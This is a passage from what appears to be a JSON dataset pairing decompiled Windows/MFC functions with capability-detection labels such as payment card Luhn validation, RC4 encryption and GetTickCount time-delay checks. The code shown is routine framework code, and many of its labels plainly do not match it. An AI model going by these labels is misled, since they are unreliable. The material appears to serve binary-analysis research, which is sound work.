            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0041829a(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00417c15(param_2);\n    }\n    if (iVar1 < 1) {\n        fcn.004016d0();\n    }\n    else {\n        uVar2 = fcn.00401940(iVar1);\n        fcn.00402bd0(uVar2, iVar1, param_2, 0xffffffff);\n        fcn.004013c0(iVar1);\n    }\n    return param_1;\n}\n",
        "token_count": 162
    },
    "0041872c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0041872c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00417b74(param_2);\n    }\n    if (iVar1 < 1) {\n        fcn.0041811c();\n    }\n    else {\n        uVar2 = fcn.00418270(iVar1);\n        fcn.00417b98(uVar2, iVar1, param_2, 0xffffffff);\n        fcn.004180d6(iVar1);\n    }\n    return param_1;\n}\n",
        "token_count": 162
    },
    "00418776": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint16_t * fcn.00418776(uint param_1, uint param_2)\n\n{\n    uint16_t *puVar1;\n    uint arg_8h;\n    uint32_t arg_ch;\n    \n    puVar1 = fcn.00402b80(param_1, param_2);\n    if (puVar1 != NULL) {\n        arg_ch = *puVar1;\n        arg_8h = fcn.00418270(arg_ch);\n        fcn.00417bb8(arg_8h, arg_ch, puVar1 + 1, *puVar1);\n        fcn.004180d6(arg_ch);\n        puVar1 = 0x1;\n    }\n    return puVar1;\n}\n",
        "token_count": 158
    },
    "00419ba7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419ba7(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_14h;\n    uint var_10h;\n    \n    fcn.00459330(&var_14h, 0, 0x14);\n    var_10h = arg_8h;\n    var_14h = 0x14;\n    (*_sym.imp.GDI32.dll_StartDocA)(*(in_ECX + 4), &var_14h);\n    return;\n}\n",
        "token_count": 115
    },
    "0041b89f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041b89f(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t pvParam;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    iVar2 = fcn.0041b655();\n    if (iVar2 == 0) {\n        if ((((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) &&\n           (iVar2 = (*_sym.imp.USER32.dll_SystemParametersInfoA)(0x30, 0, &pvParam, 0),  iVar2 != 0)) {\n            arg_ch[1] = 0;\n            arg_ch[2] = 0;\n            pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n            uVar4 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0);\n            arg_ch[3] = uVar4;\n            uVar4 = (*pcVar1)(1);\n            arg_ch[5] = pvParam;\n            arg_ch[6] = uStack16;\n            arg_ch[7] = uStack12;\n            arg_ch[8] = uStack8;\n            uVar3 = 1;\n            arg_ch[4] = uVar4;\n            arg_ch[9] = 1;\n            if (0x47 < *arg_ch) {\n                fcn.004593aa(arg_ch + 10, 0x20, \"DISPLAY\", 0x1f);\n            }\n        }\n        else {\n            uVar3 = 0;\n        }\n    }\n    else {\n        uVar3 = (**0x4acfd8)(arg_8h, arg_ch);\n    }\n    return uVar3;\n}\n",
        "token_count": 421
    },
    "0041c771": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.0041c771(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *extraout_ECX;\n    \n    piVar1 = *param_1;\n    if (piVar1 == NULL) {\n        piVar1 = fcn.0041901a();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *piVar1;\n    return piVar1 + 2;\n}\n",
        "token_count": 107
    },
    "0041df87": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041df87(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00458e78(0x24);\n    *(unaff_EBP + -0x2c) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x28) = extraout_ECX;\n    *(unaff_EBP + -0x24) = 0;\n    iVar1 = fcn.0042b206();\n    *(unaff_EBP + -0x18) = iVar1;\n    *(unaff_EBP + -0x14) = *(iVar1 + 0xdc);\n    *(iVar1 + 0xdc) = extraout_ECX[8];\n    iVar1 = *extraout_ECX;\n    *(unaff_EBP + 8) = 0;\n    *(unaff_EBP + -4) = 0;\n    (**(iVar1 + 0xf4))(unaff_EBP + -0x2c);\n    *(unaff_EBP + 8) = 1;\n    *(*(unaff_EBP + -0x18) + 0xdc) = *(unaff_EBP + -0x14);\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 357
    },
    "0041e012": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e012(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_60h;\n    uint lprcSrc;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t lpPoints;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t lprcDst;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.004225b8();\n    if (arg_8h == 0) {\n        if ((var_4h & 0x40000000) == 0) {\n            iVar5 = (*_sym.imp.USER32.dll_GetWindow)(*(in_ECX + 0x20), 4);\n        }\n        else {\n            iVar5 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x20));\n        }\n        if ((iVar5 != 0) && (iVar4 = (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x36b, 0, 0),  iVar4 != 0)) {\n            iVar5 = iVar4;\n        }\n    }\n    else {\n        iVar5 = *(arg_8h + 0x20);\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowRect;\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x20), &var_38h);\n    if ((var_4h & 0x40000000) == 0) {\n        if ((iVar5 != 0) &&\n           ((uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar5, 0xfffffff0),  (uVar2 & 0x10000000) == 0 ||\n            ((uVar2 & 0x20000000) != 0)))) {\n            iVar5 = 0;\n        }\n        if (iVar5 == 0) {\n            iVar5 = fcn.0041cd8c();\n            if (iVar5 != 0) {\n                iVar5 = *(iVar5 + 0x20);\n            }\n            uVar3 = fcn.0041b834(iVar5, 1);\n            fcn.0041b89f(uVar3, iVar5);\n            pcVar1 = _sym.imp.USER32.dll_CopyRect;\n            (*_sym.imp.USER32.dll_CopyRect)(&lpPoints, &lprcSrc);\n            (*pcVar1)(&lprcDst, &lprcSrc);\n        }\n        else {\n            (*pcVar1)(iVar5, &lpPoints);\n            uVar3 = fcn.0041b834(iVar5, 2);\n            fcn.0041b89f(uVar3, iVar5);\n            (*_sym.imp.USER32.dll_CopyRect)(&lprcDst, &lprcSrc);\n        }\n    }\n    else {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x20));\n        pcVar1 = _sym.imp.USER32.dll_GetClientRect;\n        (*_sym.imp.USER32.dll_GetClientRect)(uVar3, &lprcDst);\n        (*pcVar1)(iVar5, &lpPoints);\n        (*_sym.imp.USER32.dll_MapWindowPoints)(iVar5, uVar3, &lpPoints, 2);\n    }\n    iVar5 = (lpPoints + var_20h) / 2 - (var_30h - var_38h) / 2;\n    iVar4 = (var_24h + var_1ch) / 2 - (var_2ch - var_34h) / 2;\n    if ((lprcDst <= iVar5) && (lprcDst = iVar5,  var_10h < (var_30h - var_38h) + iVar5)) {\n        lprcDst = (var_38h - var_30h) + var_10h;\n    }\n    if ((var_14h <= iVar4) && (var_14h = iVar4,  var_ch < (var_2ch - var_34h) + iVar4)) {\n        var_14h = (var_34h - var_2ch) + var_ch;\n    }\n    fcn.00422a19(0, lprcDst, var_14h, 0xffffffff, 0xffffffff, 0x15);\n    return;\n}\n",
        "token_count": 1081
    },
    "0041e6a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0041e6a5(void)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    uint *puVar2;\n    uint32_t unaff_retaddr;\n    \n    iVar1 = fcn.0041e60a(0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = iVar1 + 0x1c;\n    if (iVar1 == 0) {\n        fcn.0041901a();\n        iVar1 = extraout_ECX;\n    }\n    if (*(iVar1 + 4) != 0) {\n        for (puVar2 = *(*(iVar1 + 4) + ((unaff_retaddr >> 4) % *(iVar1 + 8)) * 4); puVar2 != NULL; puVar2 = *puVar2) {\n            if (puVar2[1] == unaff_retaddr) {\n                return puVar2[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 225
    },
    "004212fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004212fe(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStackY532;\n    uint in_stack_fffffe08;\n    \n    fcn.00458e78();\n    fcn.0042b7b9();\n    fcn.004220cc();\n    *in_FS_OFFSET = uStackY532;\n    fcn.004566a8(in_stack_fffffe08);\n    return;\n}\n",
        "token_count": 93
    },
    "004216eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004216eb(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0042b206();\n    iVar1 = iVar1 + 0x7c;\n    iVar2 = fcn.0042b7b9();\n    var_1ch = *(iVar2 + 8);\n    if (((arg_ch == 0) && (arg_10h == 0)) && (arg_14h == 0)) {\n        puVar3 = fcn.0045924d();\n        var_4h = *puVar3;\n        puVar3 = fcn.0045924d();\n        *puVar3 = 0;\n        fcn.004595e0(iVar1, 0x60, 0x5f, \"Afx:%p:%x\", var_1ch);\n    }\n    else {\n        puVar3 = fcn.0045924d();\n        var_4h = *puVar3;\n        puVar3 = fcn.0045924d();\n        *puVar3 = 0;\n        fcn.004595e0(iVar1, 0x60, 0x5f, \"Afx:%p:%x:%p:%p:%p\", var_1ch);\n    }\n    piVar4 = fcn.0045924d();\n    if (*piVar4 == 0) {\n        puVar3 = fcn.0045924d();\n        *puVar3 = var_4h;\n    }\n    else {\n        puVar3 = fcn.0045924d();\n        fcn.00418055(*puVar3);\n    }\n    iVar2 = fcn.0041ca87(var_1ch, iVar1, &var_2ch);\n    if (iVar2 == 0) {\n        var_2ch = arg_8h;\n        var_28h = _sym.imp.USER32.dll_DefWindowProcA;\n        var_18h = arg_14h;\n        var_14h = arg_ch;\n        var_10h = arg_10h;\n        var_20h = 0;\n        var_24h = 0;\n        var_ch = 0;\n        var_8h = iVar1;\n        iVar2 = fcn.0042165d(&var_2ch);\n        if (iVar2 == 0) {\n            fcn.004198b5();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 668
    },
    "00421c9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00421c9c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0045ac18(param_1, param_2, 0x10);\n    return iVar1 == 0;\n}\n",
        "token_count": 62
    },
    "00421cb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.00421cb4(int32_t arg_8h, uint *arg_ch, uint noname_2, code *arg_14h, uint *arg_18h, int32_t arg_1ch, \n            int32_t *arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    uint unaff_EBX;\n    uint uVar3;\n    uint *unaff_ESI;\n    uint *puVar4;\n    \n    uVar3 = unaff_EBX;\n    puVar4 = unaff_ESI;\n    if (arg_8h != 0) goto code_r0x00421cc3;\ncode_r0x00421cbe:\n    fcn.0041901a();\n    arg_8h = extraout_ECX;\n    uVar3 = unaff_EBX;\n    puVar4 = unaff_ESI;\ncode_r0x00421cc3:\n    unaff_EBX = 1;\n    if (arg_20h != NULL) {\n        *arg_20h = arg_8h;\n        arg_20h[1] = arg_14h;\n        return 1;\n    }\n    if (0xb < arg_1ch - 0x38U) {\n        return 0;\n    }\n    // switch table (12 cases) at 0x421dbc\n    unaff_ESI = puVar4;\n    switch(*((arg_1ch - 0x38U) * 4 + 0x421dbc)) {\n    case 0x421cf4:\n        (*arg_14h)();\n        return 1;\n    case 0x421cfc:\n        uVar2 = (*arg_14h)();\n        return uVar2;\n    case 0x421d04:\n        arg_18h = arg_ch;\n        break;\n    case 0x421d0f:\n        arg_18h = arg_ch;\n        goto code_r0x00421da8;\n    case 0x421d17:\n        if (arg_18h != NULL) {\n            (*arg_14h)(arg_18h[1], *arg_18h);\n            return 1;\n        }\n        goto code_r0x00421cbe;\n    case 0x421d2b:\n        if (arg_18h != NULL) {\n            uVar2 = (*arg_14h)(arg_18h[1], *arg_18h);\n            return uVar2;\n        }\n        goto code_r0x00421cbe;\n    case 0x421d3c:\n        if (arg_18h != NULL) {\n            (*arg_14h)(arg_ch, arg_18h[1], *arg_18h);\n            return 1;\n        }\n        goto code_r0x00421cbe;\n    case 0x421d54:\n        if (arg_18h != NULL) {\n            uVar2 = (*arg_14h)(arg_ch, arg_18h[1], *arg_18h);\n            return uVar2;\n        }\n        goto code_r0x00421cbe;\n    case 0x421d6c:\n        unaff_ESI = arg_18h;\n        if (arg_18h != NULL) {\n            (*arg_14h)(arg_18h);\n            goto code_r0x00421d7b;\n        }\n        goto code_r0x00421cbe;\n    case 0x421d89:\n        goto code_r0x00421d89;\n    case 0x421d9d:\n        break;\n    case 0x421da5:\ncode_r0x00421da8:\n        uVar2 = (*arg_14h)(arg_18h);\n        return uVar2;\n    }\n    (*arg_14h)(arg_18h);\n    return 1;\ncode_r0x00421d89:\n    unaff_ESI = arg_18h;\n    if (arg_18h != NULL) {\n        (*arg_14h)(arg_18h, arg_ch, puVar4, uVar3);\ncode_r0x00421d7b:\n        iVar1 = arg_18h[7];\n        arg_18h[7] = 0;\n        return iVar1 == 0;\n    }\n    goto code_r0x00421cbe;\n}\n",
        "token_count": 965
    },
    "0042296a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0042296a(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    \n    iVar1 = *param_1;\n    if (iVar1 == 0) {\n        iVar1 = fcn.0041901a();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *(iVar1 + 4);\n    return iVar1 + 8;\n}\n",
        "token_count": 103
    },
    "0042301f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042301f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(param_1 + 0x4c);\n    if (iVar1 == 0) {\n        return iVar1;\n    }\n    iVar1 = *(iVar1 + 0x44);\n    while( true ) {\n        if (iVar1 == 0) {\n            return 0;\n        }\n        piVar2 = *(iVar1 + 8);\n        if (piVar2[1] == 0) {\n            iVar4 = *piVar2;\n        }\n        else {\n            iVar4 = *(piVar2[1] + 0x24);\n        }\n        if ((iVar4 != 0) && (iVar3 = (*_sym.imp.USER32.dll_GetFocus)(),  iVar4 == iVar3)) break;\n        if ((piVar2[1] != 0) && (piVar2[1] == *(*(param_1 + 0x4c) + 0x70))) {\n            return iVar1;\n        }\n        fcn.00422951();\n    }\n    return iVar1;\n}\n",
        "token_count": 296
    },
    "00423baf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00423baf(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    \n    iVar1 = *param_1;\n    if (iVar1 == 0) {\n        iVar1 = fcn.0041901a();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *(iVar1 + 4);\n    return iVar1 + 8;\n}\n",
        "token_count": 103
    },
    "00424172": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00424172(uint param_1, uchar *param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    \n    if ((param_2 != NULL) && (param_3 != 0)) {\n        iVar2 = fcn.0042b7b9();\n        puVar3 = fcn.00402b80(*(iVar2 + 0xc), param_1);\n        if (puVar3 == NULL) {\n            *param_2 = 0;\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, puVar3 + 1, *puVar3, param_2, param_3 + -1, 0, 0)\n            ;\n            param_2[iVar2] = 0;\n        }\n        return iVar2;\n    }\n    fcn.0041901a();\n    pcVar1 = swi(3);\n    iVar2 = (*pcVar1)();\n    return iVar2;\n}\n",
        "token_count": 248
    },
    "0042440d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042440d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    *(param_1 + 0xa0) = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_14h = 4;\n    var_ch = 0;\n    piVar2 = 0x4a8b9c;\n    var_10h = param_1;\n    iVar1 = *0x4a8b9c;\n    while (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000001, *piVar2, 0, 1, &var_4h);\n        if (iVar1 == 0) {\n            for (piVar3 = piVar2[1]; *piVar3 != 0; piVar3 = piVar3 + 2) {\n                iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(var_4h, *piVar3, 0, &var_ch, &var_8h, &var_14h);\n                if ((iVar1 == 0) && (var_ch == 4)) {\n                    if (var_8h == 0) {\n                        *(var_10h + 0xa0) = *(var_10h + 0xa0) & ~piVar3[1];\n                    }\n                    else {\n                        *(var_10h + 0xa0) = *(var_10h + 0xa0) | piVar3[1];\n                    }\n                }\n                var_8h = 0;\n                var_14h = 4;\n                var_ch = 0;\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n            var_4h = 0;\n        }\n        piVar2 = piVar2 + 2;\n        iVar1 = *piVar2;\n    }\n    return 1;\n}\n",
        "token_count": 503
    },
    "00424609": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00424609(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWinApp.0;\n    piVar1 = extraout_ECX[0x16];\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))(1);\n    }\n    if (extraout_ECX[0x22] != NULL) {\n        (**(*extraout_ECX[0x22] + 0x18))(1);\n    }\n    iVar3 = fcn.0042b7b9();\n    if (*(iVar3 + 0x14) == '\\0') {\n        if (*0x4ad17c != NULL) {\n            (**(**0x4ad17c + 4))(1);\n            *0x4ad17c = NULL;\n        }\n        if (*0x4ad178 != NULL) {\n            (**(**0x4ad178 + 4))(1);\n            *0x4ad178 = NULL;\n        }\n    }\n    if (extraout_ECX[0x1c] != NULL) {\n        fcn.00431de8(extraout_ECX[0x1c]);\n    }\n    if (extraout_ECX[0x1d] != NULL) {\n        fcn.00431de8(extraout_ECX[0x1d]);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalDeleteAtom;\n    if (*(extraout_ECX + 0x24) != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(*(extraout_ECX + 0x24));\n    }\n    if (*(extraout_ECX + 0x92) != 0) {\n        (*pcVar2)(*(extraout_ECX + 0x92));\n    }\n    if (extraout_ECX[0x23] != NULL) {\n        (**(*extraout_ECX[0x23] + 4))(1);\n    }\n    iVar3 = fcn.0042b7b9();\n    if (*(iVar3 + 0x10) == extraout_ECX[0x14]) {\n        *(iVar3 + 0x10) = 0;\n    }\n    if (*(iVar3 + 4) == extraout_ECX) {\n        *(iVar3 + 4) = 0;\n    }\n    fcn.0045839d(extraout_ECX[0x14]);\n    fcn.0045839d(extraout_ECX[0x15]);\n    fcn.0045839d(extraout_ECX[0x18]);\n    fcn.0045839d(extraout_ECX[0x19]);\n    fcn.0045839d(extraout_ECX[0x1a]);\n    *(unaff_EBP + -4) = 0xffffffff;\n    extraout_ECX[0xb] = NULL;\n    fcn.00425491();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 767
    },
    "0042498c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042498c(uint param_1, uint param_2, uint param_3)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0045c78f(param_1, param_2, param_3);\n    fcn.0040e7f0(uVar1);\n    return;\n}\n",
        "token_count": 75
    },
    "0042545a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042545a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0x20) = 0;\n    *(param_1 + 0x24) = 0;\n    *(param_1 + 0x2c) = 0;\n    *(param_1 + 0x30) = 0;\n    iVar1 = fcn.0042b206();\n    *(iVar1 + 0x34) = 0;\n    *(iVar1 + 0x54) = 0;\n    (*_sym.imp.USER32.dll_GetCursorPos)(iVar1 + 0x4c);\n    *(param_1 + 0x40) = 0;\n    *(param_1 + 0x3c) = 0;\n    *(param_1 + 0x28) = 1;\n    return;\n}\n",
        "token_count": 199
    },
    "00425580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00425580(int32_t *param_1, int32_t param_2)\n\n{\n    code **ppcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint arg_14h;\n    \n    ppcVar1 = (**(*param_1 + 0x28))();\n    pcVar3 = *ppcVar1;\n    do {\n        if (pcVar3 == NULL) {\n            return 0;\n        }\n        arg_14h = 0;\n        if (*(param_2 + 4) < 0xc000) {\n            iVar2 = fcn.0041c2bc(ppcVar1[1], *(param_2 + 4), 0, 0);\n            if (iVar2 != 0) {\ncode_r0x004255b5:\n                (**(iVar2 + 0x14))(*(param_2 + 8), *(param_2 + 0xc));\n                return 1;\n            }\n        }\n        else {\n            pcVar3 = ppcVar1[1];\n            while (iVar2 = fcn.0041c2bc(pcVar3, 0xc000, 0, arg_14h),  iVar2 != 0) {\n                if (**(iVar2 + 0x10) == *(param_2 + 4)) goto code_r0x004255b5;\n                pcVar3 = iVar2 + 0x18;\n            }\n        }\n        ppcVar1 = (**ppcVar1)();\n        pcVar3 = *ppcVar1;\n    } while( true );\n}\n",
        "token_count": 353
    },
    "00425b08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __thiscall fcn.00425b08(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    if (param_2 < 1) {\n        iVar3 = *(param_1 + 0x20);\n        if (((iVar3 != 0) && (*(iVar3 + 0x20) != 0)) &&\n           (iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar3 + 0x20)),  iVar1 != 0)) {\n            fcn.0041ef6e(iVar3, *(iVar3 + 0x20), 0x363, 1, 0);\n            fcn.0041f27a(*(iVar3 + 0x20), 0x363, 1, 0, 1, 1);\n        }\n        fcn.0042b7b9();\n        iVar1 = fcn.00424ceb();\n        for (iVar1 = *(iVar1 + 8); iVar1 != 0; iVar1 = *(iVar1 + 0x6c)) {\n            if ((*(iVar1 + 0x20) != 0) && (iVar1 != iVar3)) {\n                if (*(iVar1 + 0xa0) == 0) {\n                    fcn.004226fd(0);\n                }\n                iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar1 + 0x20));\n                if ((iVar2 != 0) || (-1 < *(iVar1 + 0xa0))) {\n                    fcn.0041ef6e(iVar1, *(iVar1 + 0x20), 0x363, 1, 0);\n                    fcn.0041f27a(*(iVar1 + 0x20), 0x363, 1, 0, 1, 1);\n                }\n                if (0 < *(iVar1 + 0xa0)) {\n                    fcn.004226fd();\n                }\n                *(iVar1 + 0xa0) = 0xffffffff;\n            }\n        }\n    }\n    else {\n        fcn.0042b7b9();\n        iVar3 = fcn.00424ceb();\n        if (*(iVar3 + 0x10) == 0) {\n            fcn.004319c6();\n            fcn.00431c37(1);\n        }\n    }\n    return unaff_retaddr < 0;\n}\n",
        "token_count": 557
    },
    "00425d1b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00425d1b(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t hHandle;\n    int32_t hEvent;\n    int32_t var_4h;\n    \n    if (*(in_ECX + 0x2c) != 0) {\n        fcn.0041901a();\n    }\n    fcn.00459330(&var_1ch, 0, 0x1c);\n    var_1ch = fcn.0042b206();\n    pcVar1 = _sym.imp.KERNEL32.dll_CreateEventA;\n    hHandle = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 1, 0, 0);\n    hEvent = (*pcVar1)(0, 1, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    var_14h = arg_8h;\n    if (hHandle != 0) {\n        if (hEvent != 0) {\n            iVar2 = fcn.0045ca26(arg_10h, arg_ch, 0x425c03, &var_1ch, arg_8h | 4, in_ECX + 0x30);\n            *(in_ECX + 0x2c) = iVar2;\n            if (iVar2 == 0) {\n                return 0;\n            }\n            (*_sym.imp.KERNEL32.dll_ResumeThread)(iVar2);\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hHandle, 0xffffffff);\n            (*pcVar1)(hHandle);\n            if ((arg_8h & 4) != 0) {\n                (*_sym.imp.KERNEL32.dll_SuspendThread)(*(in_ECX + 0x2c));\n            }\n            if (var_4h == 0) {\n                (*_sym.imp.KERNEL32.dll_SetEvent)(hEvent);\n                return 1;\n            }\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(in_ECX + 0x2c), 0xffffffff);\n            (*pcVar1)(*(in_ECX 